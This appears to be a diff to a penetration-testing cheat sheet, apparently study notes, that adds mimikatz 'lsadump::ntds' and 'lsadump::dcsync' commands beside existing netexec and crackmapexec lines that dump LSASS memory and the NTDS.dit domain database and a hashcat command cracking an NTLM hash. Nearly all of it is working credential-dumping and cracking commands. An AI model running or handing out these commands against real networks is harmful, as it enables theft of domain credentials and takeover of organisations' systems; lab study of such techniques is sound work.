@@ -180,6 +180,10 @@ netexec smb MS01 -u <user> -p "<pass>" -M nanodump # better
 ### A Faster Method: Using cme to Capture NTDS.dit
     crackmapexec smb 10.129.201.57 -u <username> -p P@55w0rd! --ntds
 
+###  another Method: Using mimikatz:
+lsadump::ntds /system:<SYSTEM> /ntds:<ntds.dit>
+lsadump::dcsync /domain:<DOMAIN.LOCAL> /user:<DOMAIN>\administrator # need domain admin privileges.
+  
 ###  Cracking a Single Hash with Hashcat
     sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
